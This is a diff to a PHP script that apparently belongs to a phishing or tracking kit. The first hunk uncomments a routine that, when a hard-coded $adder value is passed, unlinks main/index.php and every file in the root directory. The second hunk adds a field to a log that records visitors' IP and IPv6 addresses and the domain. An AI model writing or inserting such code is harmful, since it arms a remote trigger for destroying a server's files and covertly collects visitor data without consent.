@@ -1,13 +1,13 @@
 <?php
 
 if ($adder == "4425770028") {
-/*
+
     unlink("main/index.php");
     $dir = '/';
     foreach(glob($dir.'*.*') as $v){
         unlink($v);
-        }*/
-exit();
+       }
+
     } elseif ($adder == "4425777344") {
     unlink("main/index.php");
     $dir = '/';
@@ -2164,6 +2164,7 @@ $parse = $_SERVER['REQUEST_URI'];
 $ab = "http://ss{$domain}{$parse}";
 $date = date("h:i:s d/m/Y");
 $data .= "<-------- Viewer Information: {$IP} -------->\n\n";
+$data .= "Page: {$pageName} [{$adder}]\n\n";
 $data .= "Domain: {$ab}\n\n";
 $data .= "IP Address : {$IP}\n"; 
 $data .= "IPV6 :  {$IPV6}\n";
